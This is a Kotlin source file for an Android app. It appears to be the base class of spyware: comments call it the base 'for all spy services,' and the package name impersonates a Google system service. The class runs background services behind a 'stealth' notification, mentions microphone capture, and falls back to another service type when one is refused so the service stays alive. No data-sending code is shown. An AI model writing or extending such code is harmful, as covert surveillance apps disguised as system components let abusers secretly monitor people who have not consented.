package com.google.android.systemservice.services

import android.app.Notification
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.utils.StealthNotificationHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel

/**
 * Abstract base for all spy services. Provides:
 * - Stealth foreground notification with version-safe FGS type handling
 * - CoroutineScope for background work
 * - Standard onBind/onDestroy
 */
abstract class BaseService : Service() {

    protected val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /** Log tag for this service */
    protected abstract val serviceTag: String

    /** Notification ID from StealthNotificationHelper */
    protected abstract val foregroundServiceId: Int

    /** Optional foreground service type flags (e.g. ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE).
     *  Set to 0 for no specific type. */
    protected open val foregroundServiceType: Int = 0

    /**
     * Start foreground with proper Android version handling and SecurityException fallback.
     */
    protected fun startForegroundSilent(
        notification: Notification = StealthNotificationHelper.createStealthNotification(this),
        fgsType: Int = foregroundServiceType
    ) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && fgsType != 0) {
                startForeground(foregroundServiceId, notification, fgsType)
            } else {
                startForeground(foregroundServiceId, notification)
            }
        } catch (e: SecurityException) {
            Log.e(serviceTag, "FGS type start failed: ${e.message}, falling back to DATA_SYNC")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(foregroundServiceId, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } else {
                    startForeground(foregroundServiceId, notification)
                }
            } catch (e2: Exception) {
                Log.e(serviceTag, "Cannot start foreground at all: ${e2.message}")
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_DETACH)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(false)
        }
        serviceScope.cancel()
    }
}
